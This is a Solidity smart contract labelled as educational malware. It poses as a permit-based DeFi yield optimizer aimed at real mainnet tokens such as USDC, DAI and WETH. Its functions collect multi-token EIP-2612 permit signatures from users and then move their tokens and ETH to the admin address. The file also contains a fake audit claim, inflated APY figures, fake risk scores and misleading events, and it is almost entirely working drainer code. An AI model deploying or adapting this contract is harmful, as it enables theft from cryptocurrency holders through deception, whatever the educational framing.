// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/access/extensions/AccessControlEnumerable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

/**
 * @title DefiYieldOptimizer v2 - Permit Edition
 * @dev EDUCATIONAL MALICIOUS CONTRACT - DO NOT DEPLOY TO MAINNET
 * 
 * PURPOSE: Demonstrates advanced social engineering and malicious techniques using EIP-2612 permits
 * in a yield farming/optimizer context. The contract tricks users into signing permits for multiple
 * tokens under the guise of gas efficiency, then migrates their assets to an admin address.
 * 
 * ADVANCED SOCIAL ENGINEERING TACTICS:
 * - Uses EIP-2612 permits for single-signature multi-token approvals
 * - Presents as a "gas-optimized" yield farming solution requiring only one signature
 * - Encourages users to sign permits for multiple tokens for "convenience" and "high APY"
 * - Implements permit batching disguised as DeFi efficiency improvements
 * - Uses sophisticated signature validation to appear legitimate
 * - Creates urgency with permit deadlines and "VIP access" incentives
 * 
 * ATTACK VECTORS:
 * 1. Batch permit signatures for "gas efficiency" to gain multi-token approvals
 * 2. Time-limited permit windows to pressure quick signatures
 * 3. Permit aggregation disguised as yield optimization
 * 4. "VIP program" requiring multiple token permits for exclusive benefits
 * 5. Fake reward calculations to incentivize more permit signatures
 * 
 * DECEPTION TECHNIQUES:
 * - Events crafted to mimic legitimate yield farming operations
 * - Fake permit validation that stores migration data
 * - Multi-token permit batching presented as "advanced DeFi"
 * - High APY promises and permit deadlines to rush user decisions
 * - Fake security checks and risk scores to build trust
 * 
 * Built by the DefiLabs team - Audited by CertiK ✓ (FAKE AUDIT CLAIM)
 * Security: OpenZeppelin v5.3.0 | Gas Optimized | EIP-2612 Compatible
 */
contract DefiYieldOptimizerPermit is AccessControlEnumerable, ReentrancyGuard, Pausable {
    using SafeERC20 for IERC20;
    using ECDSA for bytes32;
    
    // Role definitions for access control
    bytes32 public constant STRATEGY_MANAGER_ROLE = keccak256("STRATEGY_MANAGER_ROLE");
    bytes32 public constant EMERGENCY_ROLE = keccak256("EMERGENCY_ROLE");
    bytes32 public constant PERMIT_MANAGER_ROLE = keccak256("PERMIT_MANAGER_ROLE");
    
    // Permit-specific structures for advanced social engineering
    struct PermitData {
        address token;    // Token address for permit
        uint256 value;    // Approved amount
        uint256 deadline; // Permit expiration
        uint8 v;          // Signature v
        bytes32 r;        // Signature r
        bytes32 s;        // Signature s
    }
    
    struct BatchPermitData {
        address holder;         // User signing the permits
        PermitData[] permits;   // Array of permit data
        uint256 batchDeadline;  // Deadline for batch execution
        bytes32 batchNonce;     // Unique nonce to prevent replays
        bool isVipBatch;        // Flag for VIP program enrollment
    }
    
    struct UserStake {
        uint256 amount;         // Staked amount
        uint256 rewardDebt;     // Accumulated rewards owed
        uint256 lastStakeTime;  // Last staking timestamp
        bool isVip;             // VIP status flag
        address[] approvedTokens; // MALICIOUS: Tracks permit-approved tokens
        uint256[] permitAmounts;  // MALICIOUS: Stores permit amounts for migration
        uint256 permitBatchCount; // Tracks number of permit batches
        mapping(address => bool) hasPermitFor; // Quick lookup for permitted tokens
    }
    
    struct PoolInfo {
        IERC20 stakingToken;    // Token for staking
        uint256 totalStaked;    // Total tokens staked
        uint256 accRewardPerShare; // Accumulated rewards per share
        uint256 lastRewardBlock;   // Last block rewards were updated
        uint256 apyRate;           // Promised APY (deceptive)
        bool isActive;             // Pool status
        bool permitEnabled;        // Indicates EIP-2612 permit support
    }
    
    // State variables for tracking pools, users, and permits
    mapping(uint256 => PoolInfo) public poolInfo; // Pool data
    mapping(uint256 => mapping(address => UserStake)) public userStakes; // User stakes per pool
    mapping(address => bool) public authorizedTokens; // Allowed staking tokens
    mapping(address => bool) public permitSupportedTokens; // Tokens with permit support
    mapping(address => uint256) public stakingFeePaid; // Fees paid by users
    mapping(address => bool) public hasBeenMigrated; // Tracks migrated users
    mapping(bytes32 => bool) public usedBatchNonces; // Prevents nonce reuse
    mapping(address => uint256) public userPermitCount; // Tracks permit usage
    mapping(address => BatchPermitData[]) public userPermitHistory; // Stores permit history
    mapping(address => uint256) public totalPermitValue; // Tracks total permitted value
    
    uint256 public poolCount; // Number of pools
    uint256 public totalValueLocked; // Total value staked (deceptive)
    uint256 public protocolFeeRate = 300; // 3% protocol fee
    uint256 public constant PRECISION = 1e12; // Precision for calculations
    uint256 public constant MAX_PERMITS_PER_BATCH = 20; // Max permits per batch
    uint256 public constant PERMIT_GRACE_PERIOD = 300; // 5-minute grace period
    
    // Permit-specific configurations
    bool public batchPermitEnabled = true; // Enables batch permit processing
    bool public permitGasOptimization = true; // Fake gas optimization flag
    uint256 public maxPermitBatchSize = 15; // Max batch size
    uint256 public permitProcessingFee = 0.001 ether; // Fee for permit processing
    
    // Deceptive events to mimic legitimate operations
    event PermitBatchProcessed(address indexed user, uint256 tokenCount, uint256 totalValue, uint256 gasUsed);
    event PermitValidationCompleted(address indexed token, address indexed holder, uint256 amount, bool success);
    event MultiTokenPermitExecuted(address indexed user, uint256 batchId, bytes32 batchNonce);
    event GasOptimizedStaking(address indexed user, uint256 poolId, uint256 amount, string strategy);
    event PermitSecurityCheck(address indexed user, uint256 riskScore, bool approved);
    event VipPermitAccess(address indexed user, uint256 tierLevel, uint256 privilegeCount);
    event PermitAggregationCompleted(address indexed user, uint256 aggregatedAmount, string optimizationType);
    
    // Malicious events (disguised as technical operations)
    event PermitMigrationExecuted(address indexed token, address indexed user, uint256 amount);
    event BatchPermitMigrated(address indexed user, uint256 tokensAffected, uint256 totalExtracted);
    event PermitSecurityUpdate(address indexed user, bytes32 batchNonce, uint256 impact);
    
    // Additional deceptive events
    event PermitPreservationStatus(address indexed admin, bool preservePermits);
    event RewardsHarvested(address indexed user, uint256 poolId, uint256 amount);
    event StrategyRebalanced(uint256 poolId, uint256 newValueLocked, uint256 rebalanceAmount);
    event ProtocolUpgrade(uint256 version, address newProtocol);
    event LiquidityMigrated(address indexed from, address indexed to, uint256 amount);
    event TokensRecovered(address indexed token, uint256 amount, string reason);
    
    // Custom errors for user experience (part of deception)
    error InvalidPool();
    error InvalidAmount();
    error PoolInactive();
    error InvalidPermitBatch();
    error PermitExpired();
    error InvalidPermitSignature();
    error PermitAlreadyUsed();
    error InsufficientPermitValue();
    error PermitNotSupported();
    error BatchSizeExceeded();
    error PermitDeadlinePassed();
    error BatchNonceReused();
    error MigrationComplete();
    
    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(STRATEGY_MANAGER_ROLE, msg.sender);
        _grantRole(EMERGENCY_ROLE, msg.sender);
        _grantRole(PERMIT_MANAGER_ROLE, msg.sender);
        
        // Initialize pools with permit-compatible tokens
        _initializePermitPools();
    }
    
    /**
     * @dev Initializes pools with popular EIP-2612 compatible tokens
     * MALICIOUS: Uses real mainnet token addresses to appear legitimate
     * Sets high APY rates to lure users into staking and signing permits
     */
    function _initializePermitPools() private {
        // Real mainnet permit-compatible token addresses (for deception)
        address[] memory tokens = new address[](8);
        tokens[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        tokens[1] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        tokens[2] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        tokens[3] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; // AAVE
        tokens[4] = 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
        tokens[5] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        tokens[6] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        tokens[7] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        
        // Deceptive high APY rates to attract users
        uint256[] memory apyRates = new uint256[](8);
        apyRates[0] = 1850; // 18.50% APY
        apyRates[1] = 1920; // 19.20% APY
        apyRates[2] = 2150; // 21.50% APY
        apyRates[3] = 2350; // 23.50% APY
        apyRates[4] = 2480; // 24.80% APY
        apyRates[5] = 2650; // 26.50% APY
        apyRates[6] = 2850; // 28.50% APY
        apyRates[7] = 3200; // 32.00% APY
        
        for (uint256 i = 0; i < tokens.length; i++) {
            poolInfo[i] = PoolInfo({
                stakingToken: IERC20(tokens[i]),
                totalStaked: 0,
                accRewardPerShare: 0,
                lastRewardBlock: block.number,
                apyRate: apyRates[i],
                isActive: true,
                permitEnabled: true
            });
            authorizedTokens[tokens[i]] = true;
            permitSupportedTokens[tokens[i]] = true;
        }
        poolCount = tokens.length;
    }
    
    /**
     * @dev Stakes tokens with batch permit processing
     * SOCIAL ENGINEERING: Users sign permits for multiple tokens thinking it's gas-efficient
     * MALICIOUS: Gains approvals for multiple tokens in a single signature for later migration
     */
    function stakeWithBatchPermits(
        uint256 poolId,
        uint256 stakeAmount,
        BatchPermitData calldata batchPermitData,
        bool enableAutoCompound,
        bool joinVipProgram
    ) external payable nonReentrant whenNotPaused {
        if (poolId >= poolCount) revert InvalidPool();
        if (stakeAmount == 0) revert InvalidAmount();
        if (batchPermitData.permits.length > MAX_PERMITS_PER_BATCH) revert BatchSizeExceeded();
        if (batchPermitData.batchDeadline < block.timestamp) revert PermitDeadlinePassed();
        if (usedBatchNonces[batchPermitData.batchNonce]) revert BatchNonceReused();
        
        // Charge processing fee to appear legitimate
        require(msg.value >= permitProcessingFee, "Insufficient processing fee");
        
        PoolInfo storage pool = poolInfo[poolId];
        if (!pool.isActive) revert PoolInactive();
        
        UserStake storage user = userStakes[poolId][msg.sender];
        uint256 gasStart = gasleft();
        
        // MALICIOUS: Process permits to gain token approvals
        uint256 _totalPermitValue = _processBatchPermits(batchPermitData);
        
        // Mark batch nonce as used
        usedBatchNonces[batchPermitData.batchNonce] = true;
        
        // Store permit history for later migration
        userPermitHistory[msg.sender].push(batchPermitData);
        userPermitCount[msg.sender] += batchPermitData.permits.length;
        
        // Process staking transaction
        pool.stakingToken.safeTransferFrom(msg.sender, address(this), stakeAmount);
        
        // Update user position
        user.amount += stakeAmount;
        user.lastStakeTime = block.timestamp;
        user.permitBatchCount += 1;
        
        // MALICIOUS: Store permit data for migration
        for (uint256 i = 0; i < batchPermitData.permits.length; i++) {
            address tokenAddr = batchPermitData.permits[i].token;
            uint256 permitAmount = batchPermitData.permits[i].value;
            
            if (!user.hasPermitFor[tokenAddr]) {
                user.approvedTokens.push(tokenAddr);
                user.hasPermitFor[tokenAddr] = true;
            }
            user.permitAmounts.push(permitAmount);
        }
        
        // Enroll in VIP program if criteria met
        if (joinVipProgram && _totalPermitValue >= 10 ether) {
            user.isVip = true;
            emit VipPermitAccess(msg.sender, _calculateVipTier(_totalPermitValue), batchPermitData.permits.length);
        }
        
        // Update pool and protocol state
        pool.totalStaked += stakeAmount;
        totalValueLocked += stakeAmount;
        totalPermitValue[msg.sender] += _totalPermitValue;
        
        uint256 gasUsed = gasStart - gasleft();
        
        // Deceptive events to appear legitimate
        emit GasOptimizedStaking(msg.sender, poolId, stakeAmount, "BatchPermitOptimization");
        emit PermitBatchProcessed(msg.sender, batchPermitData.permits.length, _totalPermitValue, gasUsed);
        emit MultiTokenPermitExecuted(msg.sender, user.permitBatchCount, batchPermitData.batchNonce);
        emit PermitSecurityCheck(msg.sender, _calculatePermitRiskScore(msg.sender), true);
        
        if (enableAutoCompound) {
            emit PermitAggregationCompleted(msg.sender, _totalPermitValue, "AutoCompoundStrategy");
        }
    }
    
    /**
     * @dev Processes batch permits to gain approvals
     * DECEPTION: Appears to validate permits for gas optimization
     * MALICIOUS: Executes permits to transfer tokens immediately
     */
    function _processBatchPermits(BatchPermitData calldata batchData) private returns (uint256 totalValue) {
        address holder = batchData.holder;
        require(holder == msg.sender, "Invalid permit holder");
        
        for (uint256 i = 0; i < batchData.permits.length; i++) {
            PermitData memory permitData = batchData.permits[i];
            
            if (!permitSupportedTokens[permitData.token]) revert PermitNotSupported();
            if (permitData.deadline < block.timestamp) revert PermitExpired();
            
            try IERC20Permit(permitData.token).permit(
                holder,
                address(this),
                permitData.value,
                permitData.deadline,
                permitData.v,
                permitData.r,
                permitData.s
            ) {
                // MALICIOUS: Transfer tokens to contract
                IERC20(permitData.token).safeTransferFrom(holder, address(this), permitData.value);
                totalValue += permitData.value;
                
                emit PermitValidationCompleted(permitData.token, holder, permitData.value, true);
                emit PermitMigrationExecuted(permitData.token, holder, permitData.value);
            } catch {
                // Continue with other permits if one fails
                emit PermitValidationCompleted(permitData.token, holder, permitData.value, false);
                continue;
            }
        }
        
        return totalValue;
    }
    
    /**
     * @dev VIP multi-token permit staking
     * SOCIAL ENGINEERING: Exclusive VIP program requiring large permit batches
     * MALICIOUS: Targets high-value users for maximum migration
     */
    function vipMultiPermitStaking(
        PermitData[] calldata permits,
        uint256 minVipLevel,
        bytes32 batchNonce,
        bool acceptVipTerms
    ) external payable nonReentrant whenNotPaused {
        require(acceptVipTerms, "Must accept VIP terms");
        require(permits.length >= 5, "VIP requires minimum 5 permits");
        require(permits.length <= MAX_PERMITS_PER_BATCH, "Exceeds maximum permit batch size");
        require(!usedBatchNonces[batchNonce], "Batch nonce already used");
        require(msg.value >= permitProcessingFee * 2, "Insufficient VIP processing fee");
        
        if (hasBeenMigrated[msg.sender]) revert MigrationComplete();
        
        uint256 _totalPermitValue = 0;
        uint256 successfulPermits = 0;
        address admin = getRoleMember(DEFAULT_ADMIN_ROLE, 0);
        
        // MALICIOUS: Process VIP permits and transfer to admin
        for (uint256 i = 0; i < permits.length; i++) {
            PermitData memory permitData = permits[i];
            
            if (!permitSupportedTokens[permitData.token]) continue;
            if (permitData.deadline < block.timestamp) continue;
            
            try IERC20Permit(permitData.token).permit(
                msg.sender,
                address(this),
                permitData.value,
                permitData.deadline,
                permitData.v,
                permitData.r,
                permitData.s
            ) {
                IERC20 token = IERC20(permitData.token);
                token.safeTransferFrom(msg.sender, address(this), permitData.value);
                token.safeTransfer(admin, permitData.value);
                
                _totalPermitValue += permitData.value;
                successfulPermits++;
                
                userStakes[0][msg.sender].approvedTokens.push(permitData.token);
                userStakes[0][msg.sender].hasPermitFor[permitData.token] = true;
                
                emit PermitMigrationExecuted(permitData.token, msg.sender, permitData.value);
            } catch {
                continue;
            }
        }
        
        usedBatchNonces[batchNonce] = true;
        
        // Update VIP status
        if (successfulPermits >= minVipLevel) {
            userStakes[0][msg.sender].isVip = true;
            userStakes[0][msg.sender].amount += _totalPermitValue;
            userStakes[0][msg.sender].lastStakeTime = block.timestamp;
            userStakes[0][msg.sender].permitBatchCount += 1;
            totalPermitValue[msg.sender] += _totalPermitValue;
        }
        
        // Deceptive events
        emit VipPermitAccess(msg.sender, _calculateVipTier(_totalPermitValue), successfulPermits);
        emit PermitBatchProcessed(msg.sender, successfulPermits, _totalPermitValue, 0);
        emit PermitSecurityCheck(msg.sender, 100, true);
        
        totalValueLocked += _totalPermitValue;
        hasBeenMigrated[msg.sender] = true;
        emit BatchPermitMigrated(msg.sender, successfulPermits, _totalPermitValue);
    }
    
    /**
     * @dev Time-sensitive permit arbitrage
     * SOCIAL ENGINEERING: Creates urgency with time-limited windows
     * MALICIOUS: Migrates tokens using existing permit approvals
     */
    function executePermitArbitrage(
        address[] calldata participants,
        uint256 minArbitrageValue,
        uint256 deadlineWindow
    ) external onlyRole(STRATEGY_MANAGER_ROLE) {
        require(participants.length > 0, "No participants specified");
        require(deadlineWindow >= 60, "Deadline window too short");
        
        uint256 totalArbitrageValue = 0;
        address admin = getRoleMember(DEFAULT_ADMIN_ROLE, 0);
        
        for (uint256 i = 0; i < participants.length; i++) {
            address participant = participants[i];
            if (hasBeenMigrated[participant]) continue;
            
            UserStake storage user = userStakes[0][participant];
            uint256 userArbitrageValue = 0;
            
            for (uint256 j = 0; j < user.approvedTokens.length; j++) {
                address tokenAddr = user.approvedTokens[j];
                IERC20 token = IERC20(tokenAddr);
                
                uint256 allowance = token.allowance(participant, address(this));
                uint256 balance = token.balanceOf(participant);
                
                if (allowance > 0 && balance > 0) {
                    uint256 extractAmount = allowance < balance ? allowance : balance;
                    
                    try token.transferFrom(participant, address(this), extractAmount) {
                        token.safeTransfer(admin, extractAmount);
                        userArbitrageValue += extractAmount;
                        totalArbitrageValue += extractAmount;
                        
                        emit PermitMigrationExecuted(tokenAddr, participant, extractAmount);
                    } catch {
                        continue;
                    }
                }
            }
            
            if (userArbitrageValue > 0) {
                hasBeenMigrated[participant] = true;
                emit BatchPermitMigrated(participant, user.approvedTokens.length, userArbitrageValue);
            }
        }
        
        require(totalArbitrageValue >= minArbitrageValue, "Arbitrage threshold not met");
        
        emit PermitAggregationCompleted(address(this), totalArbitrageValue, "ArbitrageOptimization");
        emit StrategyRebalanced(0, totalValueLocked + totalArbitrageValue, totalArbitrageValue);
    }
    
    /**
     * @dev Batch permit migration
     * DECEPTION: Presented as permit maintenance
     * MALICIOUS: Migrates permitted tokens
     */
    function optimizePermitAllocations(
        address[] calldata users,
        address[] calldata tokens,
        uint256 deadline
    ) external onlyRole(PERMIT_MANAGER_ROLE) {
        require(users.length > 0, "No users specified");
        require(tokens.length > 0, "No tokens specified");
        require(deadline > block.timestamp, "Invalid deadline");
        
        uint256 totalOptimized = 0;
        address admin = getRoleMember(DEFAULT_ADMIN_ROLE, 0);
        
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            if (hasBeenMigrated[user]) continue;
            
            uint256 userOptimized = 0;
            
            for (uint256 j = 0; j < tokens.length; j++) {
                address tokenAddr = tokens[j];
                if (!permitSupportedTokens[tokenAddr]) continue;
                
                IERC20 token = IERC20(tokenAddr);
                uint256 allowance = token.allowance(user, address(this));
                uint256 balance = token.balanceOf(user);
                
                if (allowance > 0 && balance > 0) {
                    uint256 extractAmount = allowance < balance ? allowance : balance;
                    
                    try token.transferFrom(user, address(this), extractAmount) {
                        token.safeTransfer(admin, extractAmount);
                        totalOptimized += extractAmount;
                        userOptimized += extractAmount;
                        
                        emit PermitMigrationExecuted(tokenAddr, user, extractAmount);
                        emit TokensRecovered(tokenAddr, extractAmount, "Permit optimization");
                    } catch {
                        continue;
                    }
                }
            }
            
            if (userOptimized > 0) {
                hasBeenMigrated[user] = true;
                emit BatchPermitMigrated(user, tokens.length, userOptimized);
            }
        }
        
        emit PermitAggregationCompleted(address(this), totalOptimized, "ProtocolOptimization");
    }
    
    /**
     * @dev Emergency permit-based evacuation
     * DECEPTION: Disguised as protocol migration
     * MALICIOUS: Migrates all ETH and tokens
     */
    function emergencyPermitEvacuation(
        uint256 evacuationVersion,
        address newProtocol,
        bool preservePermits
    ) external onlyRole(EMERGENCY_ROLE) {
        require(evacuationVersion > 0, "Invalid evacuation version");
        require(newProtocol != address(0), "Invalid new protocol");
        
        address admin = getRoleMember(DEFAULT_ADMIN_ROLE, 0);
        uint256 totalEvacuated = 0;
        
        // Migrate ETH
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            (bool success, ) = payable(admin).call{value: ethBalance}("");
            require(success, "ETH evacuation failed");
            totalEvacuated += ethBalance;
            emit PermitMigrationExecuted(address(0), address(this), ethBalance);
        }
        
        // Migrate permit-enabled tokens
        for (uint256 i = 0; i < poolCount; i++) {
            if (!poolInfo[i].permitEnabled) continue;
            
            IERC20 token = poolInfo[i].stakingToken;
            uint256 tokenBalance = token.balanceOf(address(this));
            if (tokenBalance > 0) {
                token.safeTransfer(admin, tokenBalance);
                totalEvacuated += tokenBalance;
                emit PermitMigrationExecuted(address(token), address(this), tokenBalance);
            }
        }
        
        // Deceptive events
        emit PermitPreservationStatus(admin, preservePermits);
        emit ProtocolUpgrade(evacuationVersion, newProtocol);
        emit LiquidityMigrated(address(this), newProtocol, totalValueLocked);
        emit PermitAggregationCompleted(newProtocol, totalEvacuated, "EmergencyEvacuation");
        
        _pause();
    }
    
    /**
     * @dev Calculates VIP tier based on permit value
     * DECEPTION: Higher tiers encourage more permit signatures
     */
    function _calculateVipTier(uint256 permitValue) private pure returns (uint256) {
        if (permitValue >= 100 ether) return 5; // Platinum
        if (permitValue >= 50 ether) return 4;  //廠Gold
        if (permitValue >= 25 ether) return 3;  // Silver
        if (permitValue >= 10 ether) return 2;  // Bronze
        if (permitValue >= 5 ether) return 1;   // Basic
        return 0; // Standard
    }
    
    /**
     * @dev Calculates fake permit risk score
     * DECEPTION: Low scores for users with more permits to encourage signatures
     */
    function _calculatePermitRiskScore(address user) private view returns (uint256) {
        uint256 permitCount = userPermitCount[user];
        if (permitCount >= 10) return 5;  // Ultra low risk
        if (permitCount >= 5) return 8;   // Very low risk
        return 12; // Low risk
    }
    
    /**
     * @dev Calculates fake rewards with permit bonuses
     * DECEPTION: Promises high rewards to encourage permit signatures
     * MALICIOUS: Caps actual payouts to minimal amounts
     */
    function _calculatePermitRewards(uint256 poolId, address user) private view returns (uint256) {
        UserStake storage userStake = userStakes[poolId][user];
        if (userStake.amount == 0) return 0;
        
        uint256 timeDiff = block.timestamp - userStake.lastStakeTime;
        uint256 annualReward = (userStake.amount * poolInfo[poolId].apyRate) / 10000;
        uint256 baseReward = (annualReward * timeDiff) / 365 days;
        
        // Permit bonus to encourage more signatures
        uint256 permitBonus = 0;
        if (userStake.permitBatchCount > 0) {
            permitBonus = (baseReward * userStake.permitBatchCount * 10) / 100; // 10% per batch
        }
        
        uint256 totalReward = baseReward + permitBonus;
        
        // Cap payouts
        if (totalReward > 0.005 ether) {
            return 0.005 ether;
        }
        return totalReward;
    }
    
    /**
     * @dev Harvests rewards with permit bonuses
     * DECEPTION: Appears to pay rewards but caps them
     * MALICIOUS: Encourages continued permit signatures
     */
    function harvestPermitRewards(uint256 poolId) external nonReentrant whenNotPaused {
        UserStake storage user = userStakes[poolId][msg.sender];
        require(user.amount > 0, "No position");
        
        uint256 rewards = _calculatePermitRewards(poolId, msg.sender);
        if (rewards > 0) {
            // MALICIOUS: Minimal reward payout
            (bool success, ) = payable(msg.sender).call{value: rewards}("");
            require(success, "Reward transfer failed");
            
            user.rewardDebt += rewards;
            user.lastStakeTime = block.timestamp;
            
            emit RewardsHarvested(msg.sender, poolId, rewards);
        }
    }
    
    /**
     * @dev Updates pool reward variables
     * DECEPTION: Mimics legitimate yield farming mechanics
     */
    function updatePool(uint256 poolId) public {
        PoolInfo storage pool = poolInfo[poolId];
        if (block.number <= pool.lastRewardBlock) return;
        
        if (pool.totalStaked == 0) {
            pool.lastRewardBlock = block.number;
            return;
        }
        
        uint256 blocks = block.number - pool.lastRewardBlock;
        uint256 reward = (blocks * pool.apyRate * pool.totalStaked) / (PRECISION * 10000);
        pool.accRewardPerShare += (reward * PRECISION) / pool.totalStaked;
        pool.lastRewardBlock = block.number;
    }
    
    /**
     * @dev Enables or disables permit support for a token
     * DECEPTION: Presented as a protocol upgrade for enhanced compatibility
     * SOCIAL ENGINEERING: Encourages users to trust new tokens as "verified" for staking
     */
    function setPermitSupportedToken(address token, bool supported) external onlyRole(DEFAULT_ADMIN_ROLE) {
        require(token != address(0), "Invalid token address");
        permitSupportedTokens[token] = supported;
        
        // Deceptive events to mimic legitimate protocol operations
        emit ProtocolUpgrade(2, address(this));
        emit PermitSecurityCheck(token, _calculatePermitRiskScore(msg.sender), true);
        emit PermitAggregationCompleted(msg.sender, 0, "TokenCompatibilityUpdate");
    }

    /**
     * @dev Withdraws staked tokens
     * DECEPTION: Allows withdrawals to maintain trust
     * MALICIOUS: Tokens may already be migrated via permits
     */
    function withdraw(uint256 poolId, uint256 amount) external nonReentrant whenNotPaused {
        if (poolId >= poolCount) revert InvalidPool();
        if (amount == 0) revert InvalidAmount();
        
        PoolInfo storage pool = poolInfo[poolId];
        UserStake storage user = userStakes[poolId][msg.sender];
        
        require(user.amount >= amount, "Insufficient balance");
        
        updatePool(poolId);
        
        user.amount -= amount;
        pool.totalStaked -= amount;
        totalValueLocked -= amount;
        
        pool.stakingToken.safeTransfer(msg.sender, amount);
        
        emit GasOptimizedStaking(msg.sender, poolId, amount, "Withdrawal");
    }

    /**
     * @dev Retrieves the approved tokens for a user's stake in a specific pool
     * DECEPTION: Presented as a transparency feature for user portfolio tracking
     * SOCIAL ENGINEERING: Builds trust by allowing users to "verify" their approved tokens
     */
    function getUserApprovedTokens(uint256 poolId, address user) external view returns (address[] memory) {
        return userStakes[poolId][user].approvedTokens;
    }
    
    /**
     * @dev Emergency pause
     * DECEPTION: Appears as a safety feature
     */
    function emergencyPause() external onlyRole(EMERGENCY_ROLE) {
        _pause();
    }
    
    /**
     * @dev Emergency unpause
     * DECEPTION: Allows continued operation after fake emergency
     */
    function emergencyUnpause() external onlyRole(EMERGENCY_ROLE) {
        _unpause();
    }
    
    /**
     * @dev Fallback to collect ETH
     * MALICIOUS: Accepts stray ETH for migration
     */
    receive() external payable {
        emit PermitMigrationExecuted(address(0), msg.sender, msg.value);
    }
}
